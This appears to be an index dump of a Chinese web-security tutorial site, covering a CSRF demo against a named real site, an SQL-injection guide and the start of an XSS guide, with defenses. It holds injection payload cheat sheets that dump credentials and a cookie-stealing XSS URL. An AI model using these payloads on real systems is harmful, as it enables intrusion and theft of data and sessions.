uff1a","text":"<p>\u8fd9\u91cc\u5c31\u7528\u4e00\u4e2a\u6211\u6d4b\u8bd5\u4e2d\u53d1\u73b0\u7684csrf\u6765\u4f5c\u4e3a\u793a\u4f8b\u5427\uff0c\u4f46\u8fd9\u4e2a\u5e76\u4e0d\u80fd\u79f0\u4e4b\u4e3a\u6f0f\u6d1e\uff0c\u5382\u5546\u4e5f\u5ffd\u7565\u4e86\uff0c\u56e0\u4e3a\u51e0\u4e4e\u6ca1\u6709\u5371\u5bb3\uff0c\u90a3\u4e48\u5c31\u6f14\u793a\u4e00\u4e0b\u5927\u6982\u7684\u5229\u7528\u6d41\u7a0b</p> <p>\u9996\u5148\u51fa\u73b0csrf\u7684\u5730\u65b9\u4e3a\u9014\u864e\u517b\u8f66\u4e2a\u4eba\u4e2d\u5fc3\uff1ahttps://my.tuhu.cn/Account/UserInfo.html</p> <p>1.\u4fee\u6539\u4e2a\u4eba\u4fe1\u606f\u7528\u6237\u540d\u548c\u771f\u5b9e\u59d3\u540d\u65f6\u6293\u5305</p> <p></p> <p>2.\u5229\u7528burp\u7684CSRF\u6d4b\u8bd5\u63d2\u4ef6\u751f\u6210html\u6587\u4ef6\u8fdb\u884c\u6d4b\u8bd5</p> <p></p> <p></p> <p>3.\u751f\u6210\u7684POC\u4fee\u6539\u7528\u6237\u540d\u4e3aCSRFtest\u5e76\u4fdd\u5b58\u4e3aHTML\u6587\u4ef6</p> <p></p> <p>4.\u6253\u5f00\u751f\u6210\u7684html\u9875\u9762\u70b9\u51fb\u6309\u94ae</p> <p></p> <p>5.\u67e5\u770b\u7528\u6237\u4e2d\u5fc3\u662f\u5426\u5df2\u7ecf\u4fee\u6539\u6210\u529f</p> <p></p> <p>\u5df2\u7ecf\u4fee\u6539\u6210\u529f\u4e86\uff0c\u4f46\u662f\u6ca1\u6709\u4efb\u4f55\u5371\u5bb3\uff0c\u53ea\u80fd\u4fee\u6539\u7528\u6237\u59d3\u540d\u548c\u6635\u79f0\uff0cSRC\u7ed9\u5ffd\u7565\u4e86\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_7","title":"\u6f0f\u6d1e\u9632\u5fa1\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#referer","title":"\u68c0\u6d4breferer\u5b57\u6bb5\uff1a","text":"<p>\u4e25\u683c\u68c0\u6d4breferer\u5b57\u6bb5\uff0c\u9632\u6b62\u53ef\u4ee5\u88ab\u7ed5\u8fc7\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#token","title":"\u6dfb\u52a0token\u6821\u9a8c\uff1a","text":"<p>\u6dfb\u52a0token\u4f2a\u968f\u673a\u53c2\u6570\uff0c\u540e\u7aef\u6821\u9a8ctoken\u6709\u6548\u6027\u3002</p> <p>\u9644\u4e0a\u4e00\u5f20\u6211\u89c9\u5f97\u5bf9token\u539f\u7406\u8868\u8ff0\u7684\u6bd4\u8f83\u660e\u767d\u7684\u56fe\uff1a</p> <p></p> <p>\u7b7e\u540d\u662f\u5173\u952e\uff0c\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u540e\u53f0\u5148\u6839\u636e\u7b97\u6cd5\u548c\u5bc6\u94a5\u5bf9\u6570\u636e\u52a0\u5bc6\u540e\u548c\u7528\u6237\u63d0\u4ea4\u65f6\u9644\u5e26\u7684token\u6821\u9a8c\uff0c\u76f8\u540c\u5219\u6821\u9a8c\u901a\u8fc7\uff0c\u53cd\u4e4b\u5219\u6821\u9a8c\u5931\u8d25\uff0c\u8fd4\u56de\u9519\u8bef\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/","title":"\u57fa\u7840\u6f0f\u6d1e\u7cfb\u5217\u2014\u2014SQL\u6ce8\u5165\u6f0f\u6d1e\u8be6\u89e3","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u7b80\u4ecb\uff1a","text":"<p>SQL\u6ce8\u5165\u5373\u662f\u6307web\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u8f93\u5165\u6570\u636e\u7684\u5408\u6cd5\u6027\u6ca1\u6709\u5224\u65ad\u6216\u8fc7\u6ee4\u4e0d\u4e25\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4e8b\u5148\u5b9a\u4e49\u597d\u7684\u67e5\u8be2\u8bed\u53e5\u7684\u7ed3\u5c3e\u4e0a\u6dfb\u52a0\u989d\u5916\u7684SQL\u8bed\u53e5\uff0c\u5728\u7ba1\u7406\u5458\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u975e\u6cd5\u64cd\u4f5c\uff0c\u4ee5\u6b64\u6765\u5b9e\u73b0\u6b3a\u9a97\u6570\u636e\u5e93\u670d\u52a1\u5668\u6267\u884c\u975e\u6388\u6743\u7684\u4efb\u610f\u67e5\u8be2\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u5f97\u5230\u76f8\u5e94\u7684\u6570\u636e\u4fe1\u606f\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_2","title":"\u6f0f\u6d1e\u539f\u7406\u5b9e\u4f8b\uff1a","text":"<p>\u7528\u6237\u63d0\u4ea4\u6570\u636e\u540e\uff0c\u540e\u7aef\u670d\u52a1\u5668\u5c06\u7528\u6237\u63d0\u4ea4\u7684**\u6570\u636e\u5e26\u5165sql\u8bed\u53e5\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c**\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u90a3\u4e48\u7528\u6237\u63d0\u4ea4\u6784\u9020\u597d\u7684\u7279\u6b8a\u8bed\u53e5\uff0c\u5c31\u53ef\u4ee5**\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u975e\u6cd5\u7684\u64cd\u4f5c**\uff0c\u5373\u5f15\u53d1sql\u6ce8\u5165\uff0c\u4f8b\u5982\u4ee5\u4e0b\u4ee3\u7801\uff08sqli-labs-1\uff09</p> <pre><code>//GET\u65b9\u5f0f\u83b7\u53d6name\u4e3aid\u7684\u503c\u8d4b\u503c\u7ed9$id\u53d8\u91cf\uff1b\n$id=$_GET['id'];\n\n//\u5b9a\u4e49$sql\u53d8\u91cf\uff0c\u503c\u4e3a\u4e0b\u4e00\u6b65\u8981\u6267\u884c\u7684sql\u8bed\u53e5\uff0c\u5c06$id\u53d8\u91cf\u5e26\u5165sql\u8bed\u53e5\u4e2d\uff1b\n$sql=\"SELECT * FROM user WHERE id='$id' LIMIT 0,1\"; \n\n//\u5c06\u4e0a\u4e00\u6b65\u5b9a\u4e49\u7684$sql\u53d8\u91cf\u7684\u503c\u4f5c\u4e3asql\u8bed\u53e5\u5e26\u5165\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u5e76\u5c06\u7ed3\u679c\u8d4b\u503c\u7ed9$result\u53d8\u91cf\uff0cmysql_query\u4e3aphp\u63d0\u4f9b\u7684\u6570\u636e\u5e93\u67e5\u8be2\u51fd\u6570\uff1b\n$result=mysql_query($sql);\n\n//\u4ece\u4e0a\u4e00\u6b65\u67e5\u8be2\u7684\u7ed3\u679c\u96c6\u4e2d\u53bb\u7684\u4e00\u884c\u4f5c\u4e3a\u6570\u7ec4\u8fd4\u56de\u5e76\u8d4b\u503c\u7ed9$row\u53d8\u91cf\uff1b\n$row = mysql_fetch_array($result);\n\n//\u5982\u679c$row\u503c\u4e0d\u4e3a\u7a7a\uff0c\u5373\u6570\u636e\u5e93\u67e5\u8be2\u6570\u636e\u6b63\u5e38\uff0c\u5219\u6253\u5370\u51fausername\u548cpassword\u7684\u503c\uff1b\n    if($row)\n    {\n    echo 'Your Login name:'. $row['username'];\n    echo \"&lt;br&gt;\";\n    echo 'Your Password:' .$row['password'];\n    echo \"&lt;/font&gt;\";\n    }\n    else \n    {\n    echo '&lt;font color= \"#FFFF00\"&gt;';\n    print_r(mysql_error());\n    echo \"&lt;/font&gt;\";  \n    }\n}\n</code></pre> <p>\u6570\u636e\u5e93\u4e2d\u6709\u6570\u636e\u5982\u4e0b</p> <p></p> <p>\u90a3\u4e48\u7528\u6237\u63d0\u4ea4?id=-1\uff0c\u5219\u4ee3\u5165\u6570\u636e\u5e93\u6b63\u5e38\u67e5\u8be2\u4e14\u6b63\u5e38\u8f93\u51fa</p> <p></p> <p>\u4f46\u5982\u679c\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u4e3a</p> <pre><code>?id=-1' union select 1,2,database() --+\n</code></pre> <p>\u90a3\u4e48\u5219\u4f1a\u8fd4\u56de\u6211\u4eec\u6784\u9020\u7684\u8bed\u53e5\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u7684\u67e5\u8be2\u64cd\u4f5c\u8fd4\u56de\u7684\u503c</p> <p></p> <p>\u6211\u4eec\u5c06\u4e24\u4e2a\u63d0\u4ea4\u7684\u6570\u636e\u90fd\u5e26\u5165\u6211\u4eec\u540e\u7aef\u7684\u6267\u884c\u4e2d\u5bf9\u6bd4\uff0c\u5982\u4e0b</p> <pre><code>\u539f\u59cb\u8bed\u53e5\uff1aSELECT * FROM user WHERE id='$id' LIMIT 0,1\n\u6b63\u5e38\u5e26\u5165\u6570\u636e\uff1aSELECT * FROM user WHERE id='1' LIMIT 0,1\n\u975e\u6cd5\u5e26\u5165\u6570\u636e\uff1aSELECT * FROM user WHERE id='-1' union select 1,2,database() --+' LIMIT 0,1\n\n--\uff08\u6ce8\uff1a\u5728\u6267\u884csql\u8bed\u53e5\u65f6\uff0c\u201c--\u201d\u662fsql\u8bed\u53e5\u4e2d\u7684\u6ce8\u91ca\u7b26\uff0c\u4f46\u662f\u4f7f\u7528\u65f6--\u540e\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\u624d\u80fd\u8d77\u5230\u6ce8\u91ca\u4f5c\u7528\uff0c\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u8fd9\u91cc\u7684+\u53f7\u7ecf\u8fc7\u5904\u7406\u540e\u4f1a\u53d8\u6210\u7a7a\u683c\uff0c\u7528\u6765\u548c\u540e\u9762\u7684\u5355\u5f15\u53f7\u5206\u9694\u5f00\uff0c\u624d\u80fd\u5c06\u540e\u9762\u7684\u8bed\u53e5\u6ce8\u91ca\u3002\uff09\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u5982\u679c\u6ca1\u6709\u7ecf\u8fc7\u8fc7\u6ee4\u5c31\u5c06\u7528\u6237\u63d0\u4ea4\u7684\u975e\u6cd5\u6570\u636e\u5e26\u5165\u540e\u7aef\u6267\u884c\u7684\u8bdd\uff0c\u771f\u6b63\u6267\u884c\u7684\u8bed\u53e5\u662f<code>SELECT * FROM user WHERE id='-1' union select 1,2,database() -- ' LIMIT 0,1</code>\uff0c\u800c\u540e\u9762\u88ab\u6ce8\u91ca\u7684\u90e8\u5206\u4e0d\u6267\u884c\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u5f15\u53d1\u9519\u8bef\uff0c\u5728\u67e5\u8be2id\u5b57\u6bb5\u503c\u4e3a-1\u6ca1\u6709\u7ed3\u679c\u540e\uff0c\u5c31\u4f1a\u6267\u884cunion\u67e5\u8be2\uff0c\u67e5\u8be2\u51fa\u6570\u636e\u5e93\u540d\u5e76\u8f93\u51fa\uff0c\u8fd9\u5c31\u662f\u6700\u5178\u578b\u7684sql\u6ce8\u5165\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_3","title":"\u6f0f\u6d1e\u5206\u7c7b\uff1a","text":"<p>\u5c31\u4e0d\u6309\u7167\u6570\u5b57\u578b\u5b57\u7b26\u578b\u8fd9\u4e9b\u6765\u5206\u7c7b\u4e86\uff0c\u6211\u8ba4\u4e3a\u6309\u7167\u5229\u7528\u65b9\u5f0f\u6765\u5206\u7c7b\u66f4\u5bb9\u6613\u7406\u89e3</p> <p>\u6709\u56de\u663e </p> <pre><code>Union query #\u8054\u5408\u67e5\u8be2\u6ce8\u5165\uff0c\u901a\u8fc7union\u8054\u5408\u67e5\u8be2\u83b7\u53d6\u67e5\u8be2\u7ed3\u679c\n\nError based #\u62a5\u9519\u6ce8\u5165\uff0c\u901a\u8fc7\u62a5\u9519\u4fe1\u606f\u83b7\u53d6\u67e5\u8be2\u7ed3\u679c\n</code></pre> <p>\u65e0\u56de\u663e</p> <pre><code>Boolean based blind #\u5e03\u5c14\u76f2\u6ce8\uff0c\u901a\u8fc7\u5e94\u7528\u8fd4\u56de\u4e0d\u540c\u7684\u503c\u5224\u65ad\u6761\u4ef6\u771f\u5047\nTime based blind #\u65f6\u95f4\u76f2\u6ce8\uff0c\u901a\u8fc7\u4e0d\u540c\u7684\u65f6\u95f4\u5ef6\u8fdf\u63a8\u65ad\u6761\u4ef6\u771f\u5047\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_4","title":"\u6f0f\u6d1e\u68c0\u6d4b\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_5","title":"\u624b\u5de5\u68c0\u6d4b","text":"<p>\u63d0\u4ea4\u7684\u53c2\u6570\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\uff0c\u53c2\u6570\u6dfb\u52a0\u201c ' \u201d\uff08\u82f1\u6587\u5355\u5f15\u53f7\uff09\uff0c\u51fa\u73b0\u5f02\u5e38\uff08sql\u8bed\u6cd5\u9519\u8bef\uff09\uff0c\u5373\u5b58\u5728sql\u6ce8\u5165\uff0c\u5982\u679c\u65e0\u56de\u663e\uff0c\u53ef\u4ee5\u901a\u8fc7\u5ef6\u65f6\u6216\u8005\u5e03\u5c14\u76f2\u6ce8\u6765\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002</p> <p>\u6ce8\uff1a\u5f02\u5e38\u62a5\u9519\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u540e\u53f0\u5c06\u53c2\u6570\u4e2d\u7684\u5355\u5f15\u53f7\u5e26\u5165sql\u8bed\u53e5\u8fdb\u884c\u6570\u636e\u5e93\u64cd\u4f5c\uff0c\u591a\u4e86\u4e00\u4e2a\u5355\u5f15\u53f7\u5f15\u53d1sql\u8bed\u6cd5\u9519\u8bef\uff0c\u6240\u4ee5\u62a5\u9519\u5373\u6574\u660e\u4e86\u6211\u4eec\u7684\u5355\u5f15\u53f7\u8fdb\u5165\u4e86sql\u8bed\u53e5\u6267\u884c\u4e2d\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_6","title":"\u5de5\u5177\u68c0\u6d4b","text":"<p>\u4f7f\u7528sqlmap\u8fdb\u884c\u68c0\u6d4b\uff0c\u8fd9\u91cc\u662f\u4e0b\u8f7d\u5730\u5740\u548c\u4f7f\u7528\u8bf4\u660e\u70b9\u51fb\u8df3\u8f6c</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_7","title":"\u6f0f\u6d1e\u5229\u7528\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_8","title":"\u624b\u5de5\u6ce8\u5165","text":"<p>\u6709\u56de\u663e\u578b\u6784\u9020\u8bed\u53e5\u67e5\u8be2\u6570\u636e\uff0c\u65e0\u56de\u663e\u578b\u8fdb\u884c\u76f2\u6ce8\uff0c\u4e0d\u8fc7\u6bd4\u8f83\u8d39\u65f6\u95f4\u3002</p> <p>\u8fd9\u91cc\u5c31\u4ee5mysql\u7684\u6570\u636e\u5e93\uff0csqli-labs\u7684less-1\u4e3a\u4f8b\uff0c\u5217\u51fa\u4e00\u4e9b\u5e38\u7528\u7684\u8bed\u53e5\uff0c\u5982\u679c\u8981\u8be6\u7ec6\u5c55\u5f00\u7ec6\u8bb2\u7684\u8bdd\uff0c\u7bc7\u5e45\u80af\u5b9a\u4f1a\u7279\u522b\u7279\u522b\u957f\uff0c\u4e00\u7bc7\u6587\u7ae0\u6050\u6015\u5404\u4f4d\u770b\u5b98\u4eec\u4e5f\u770b\u4e0d\u4e0b\u53bb\uff0c\u5404\u4f4d\u9700\u8981\u7528\u5230\u66f4\u591a\u7684\u8bed\u53e5\u65f6\u81ea\u884c\u767e\u5ea6\u5373\u53ef\uff0c\u5982\u679c\u9700\u8981\u7684\u8bdd\u540e\u9762\u53ef\u4ee5\u5206\u5f00\u51fa\u8be6\u7ec6\u7684\u5404\u4e2d\u6ce8\u5165\u65b9\u5f0f\u7684\u8be6\u89e3\u6587\u7ae0\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#union","title":"UNION\u8054\u5408\u67e5\u8be2\u6ce8\u5165","text":"<pre><code>\u7206\u5217\u6570\uff1a?id=-1' order by n--+(\u201cn\u201d\u5230\u51e0\u4e0d\u62a5\u9519\u5219\u6709n-1\u5217)\n\u7206\u5e93\u540d\uff1a?id=-1' union select 1,2,database() --+\n\u7206\u8868\u660e\uff1a?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+\n\u7206\u5217\u540d\uff1a?id=-1' union select 1\uff0c2\uff0cgroup_concat(column_name) from information_schema.columns where table_name='users' --+\n\u7206\u6570\u636e\uff1a?id=-1' union select 1\uff0cgroup_concat(username),group_concat(password) from users --+\n\n\u6ce8\uff1a\u4f7f\u7528\u4e2d\u6839\u636e\u5b9e\u9645\u9700\u8981\u4fee\u6539\u5b57\u6bb5\u6570\uff08\u5217\u6570\uff09\u4ee5\u53ca\u5e93\u540d\u8868\u540d\u7b49\uff0cunion\u67e5\u8be2\u7684\u5b57\u6bb5\u6570\u9700\u8981\u548c\u8868\u4e2d\u7684\u5b57\u6bb5\u6570\u76f8\u540c\u624d\u53ef\u4ee5\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_9","title":"\u62a5\u9519\u6ce8\u5165","text":"<pre><code>\u7206\u5e93\u540d\uff1a?id=-1\u2019 union select count(*),count(*),concat(\u2018~\u2019,(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a--+\n\u7206\u8868\u540d\uff1a?id=-1' union select count(*),count(*), concat('~',(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+\n\u7206\u5217\u540d\uff1a?id=-1' union select count(*),1, concat('~',(select column_name from information_schema.columns where table_name='users' limit 1,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+\n\u7206\u6570\u636e\uff1a?id=-1' union select count(*),1, concat('~',(select concat_ws(':',username,password) from users limit 1,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_10","title":"\u65f6\u95f4\u76f2\u6ce8","text":"<pre><code>\u7206\u5e93\u957f\uff1a?id=1' and if(length(database())=8,sleep(5),NULL)--+\n\u7206\u5e93\u540d\uff1a?id=1' and if(left(database(),1)='s',sleep(5),NULL)--+\n\u7206\u8868\u540d\uff1a?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)='r',sleep(5),NULL)--+\n\u7206\u5217\u660e\uff1a?id=1' and if(left((select column_name from information_schema.columns where table_name = 'users' limit 1,1),8)='username',sleep(5),NULL)--+\n\u7206\u6570\u636e\uff1a?id=1' and if(left((select username from users order by id limit 0,1),4)='dumb',sleep(5),NULL)--+\n?id=1' and if(left((select password from users order by id limit 0,1),4)='dumb',sleep(5),NULL)--+\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_11","title":"\u5e03\u5c14\u76f2\u6ce8","text":"<pre><code>\u7206\u5e93\u540d\uff1a?id=1' and left((select database()),1)='s'--+\n\u7206\u8868\u540d\uff1a?id=1' and left((select table_name from information_schema.tables where table_schema ='security' limit 3,1),5)='users'--+\n\u7206\u5217\u660e\uff1a?id=1' and left((select column_name from information_schema.columns where table_name='users' limit 1,1),8)='username'--+\n\u7206\u6570\u636e\uff1a?id=1' and left((select username from users order by id limit 0,1),4)='dumb'--+\n</code></pre> <p>\u65e0\u56de\u663e\u7684\u8fd8\u6709\u4e00\u79cd\u5229\u7528\u65b9\u5f0f\u662f\u5229\u7528DNSlog\u5916\u5e26\u67e5\u8be2\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6709\u4e00\u4f4d\u5e08\u5085\u8bb2\u7684\u5df2\u7ecf\u5f88\u8be6\u7ec6\u4e86\uff0c\u70b9\u51fb\u67e5\u770b\u539f\u6587</p> <p>\u4ee5\u4e0a\u4e3aGET\u578b\u6ce8\u5165\uff0cPOST\u578b\u7c7b\u4f3c\uff0c\u4fee\u6539\u53c2\u6570\u503c\u5373\u53ef\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_12","title":"\u5de5\u5177\u6ce8\u5165","text":"<p>\u4f9d\u65e7\u662fsqlmap\u4e00\u628a\u68ad\uff0c\u5b9e\u6218\u4e2d\u6839\u636e\u5b9e\u9645\u9700\u6c42\u4f7f\u7528tamper\u8fdb\u884c\u7ed5\u8fc7\u4e00\u4e9b\u8fc7\u6ee4\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_13","title":"\u5e38\u89c1\u573a\u666f\uff1a","text":"<p>\u7528\u6237\u53ef\u63a7\u7684\u53c2\u6570\u4e0e\u6570\u636e\u5e93\u6709\u4ea4\u4e92\u7684\u5730\u65b9\uff0c\u5e38\u89c1\u4e0e\u67e5\u8be2\uff0c\u767b\u5f55\u7b49\uff1b</p> <p>\u5728\u6d4b\u8bd5\u4e2d\u53ef\u4ee5\u722c\u53d6\u7f51\u7ad9\u7684\u4e00\u4e9bapi\u67e5\u8be2\u63a5\u53e3\uff0c\u4e5f\u4f1a\u5b58\u5728sql\u6ce8\u5165\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#_14","title":"\u6f0f\u6d1e\u9632\u5fa1\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#wafweb","title":"WAF\uff08web\u5e94\u7528\u9632\u706b\u5899\uff09","text":"<p>\u4e3a\u7f51\u7ad9\u6dfb\u52a0waf\uff0c\u867d\u7136\u4e0d\u80fd\u4fee\u590dsql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u4f46\u662f\u53ef\u4ee5\u62e6\u622a\u654f\u611f\u6570\u636e\u4ee5\u9632\u6b62sql\u6ce8\u5165\u88ab\u9ed1\u5ba2\u5229\u7528</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#filter","title":"Filter\u8fc7\u6ee4","text":"<p>\u5728\u670d\u52a1\u5668\u7aef\u6dfb\u52a0\u8fc7\u6ee4\u4ee3\u7801\u4ee5\u8fc7\u6ee4\u53ef\u80fd\u5f15\u53d1sql\u6ce8\u5165\u7684\u654f\u611f\u5b57\u7b26</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/SQL%E6%B3%A8%E5%85%A5/#sql_1","title":"sql\u9884\u7f16\u8bd1","text":"<p>\u793a\u4f8b\uff1a</p> <pre><code>prepare baizesec from 'select username,password from users where id=\uff1f'; \u5b9a\u4e49\u9884\u7f16\u8bd1\u8bed\u53e5\nset @a=1; \u4f20\u53c2\u6570\nexecute baizesec using @a; \u8c03\u7528\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/","title":"\u57fa\u7840\u6f0f\u6d1e\u7cfb\u5217\u2014\u2014XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u8be6\u89e3","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_1","title":"\u7b80\u4ecb\uff1a","text":"<p>XSS\uff08\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff09\u653b\u51fb\u901a\u5e38\u6307\u7684\u662f\u901a\u8fc7\u5229\u7528\u7f51\u9875\u5f00\u53d1\u65f6\u7559\u4e0b\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5de7\u5999\u7684\u65b9\u6cd5\u6ce8\u5165\u6076\u610f\u6307\u4ee4\u4ee3\u7801\u5230\u7f51\u9875\uff0c\u4f7f\u7528\u6237\u52a0\u8f7d\u5e76\u6267\u884c\u653b\u51fb\u8005\u6076\u610f\u5236\u9020\u7684\u7f51\u9875\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u6076\u610f\u7f51\u9875\u7a0b\u5e8f\u901a\u5e38\u662fJavaScript\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e5f\u53ef\u4ee5\u5305\u62ecJava\u3001 VBScript\u3001ActiveX\u3001 Flash  \u6216\u8005\u751a\u81f3\u662f\u666e\u901a\u7684HTML\u3002\u653b\u51fb\u6210\u529f\u540e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u5f97\u5230\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u66f4\u9ad8\u7684\u6743\u9650\uff08\u5982\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\uff09\u3001\u79c1\u5bc6\u7f51\u9875\u5185\u5bb9\u3001\u4f1a\u8bdd\u548ccookie\u7b49\u5404\u79cd\u5185\u5bb9\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/XSS%E8%B7%A8%E7%AB%99/#_2","title":"\u6f0f\u6d1e\u539f\u7406\u5b9e\u4f8b\uff1a","text":"<p>\u5bf9\u4e8e\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u6ca1\u6709\uff0c\u540e\u53f0\u6216\u8005JS\uff08DOM\u578b\uff09\u6ca1\u6709\u505a\u8fc7\u6ee4\u6216\u8fc7\u6ee4\u4e0d\u5b8c\u5168\uff0c\u5c06\u7528\u6237\u8f93\u5165\u7684\u4fe1\u606f\u6253\u5370\u51fa\u6765\uff0c\u90a3\u4e48\u7528\u6237\u5c31\u53ef\u4ee5\u6784\u9020\u7279\u5b9a\u7684payload\u6765\u5728\u524d\u7aef\u6267\u884cjs\u8bed\u53e5\uff0c\u5c31\u9020\u6210\u4e86XSS\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff0c\u4e0b\u9762\u4e3a\u5927\u5bb6\u6f14\u793a\u6700\u7b80\u5355\u7684xss\u6f0f\u6d1e\u3002</p> <p>\u540e\u7aef\u4ee3\u7801\uff08xss.php\uff09\uff1a</p> <pre><code>&lt;?php\n\n$id=$_REQUEST['id'];\necho $id;\n\n?&gt;\n</code></pre> <p>\u6211\u4eec\u628a\u5b83\u4fdd\u5b58\u5728\u6211\u4eec\u7f51\u7ad9\u7684\u6839\u76ee\u5f55\uff0c\u5982\u679c\u7528\u6237\u6784\u9020\u5982\u4e0bpayload\uff0c\u5c31\u4f1a\u4ea7\u751f\u5f39\u7a97\uff1a\u767d\u6cfdSec</p> <pre><code>http://127.0.0.1/xss.php?id=&lt;script&gt;alert(\"\u767d\u6cfdSec\")&lt;/script&gt;\n</code></pre> <p></p> <p>\u5f53\u7136\u5f39\u7a97\u5e76\u6ca1\u6709\u4ec0\u4e48\u5371\u5bb3\uff0c\u4f46\u5982\u679c\u7528\u6237\u8bbf\u95ee\u7684\u662f\u5982\u4e0burl\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06\u7528\u6237\u7684cookie\u4fe1\u606f\u53d1\u9001\u7ed9\u653b\u51fb\u8005</p> <pre><code>http://127.0.0.1/xss.php?id=&lt;script&gt;window.open(\"http://127.0.0.1/cookie.php?cookie='+document.cookie+'\")&lt;/script&gt;\n</code></pre> 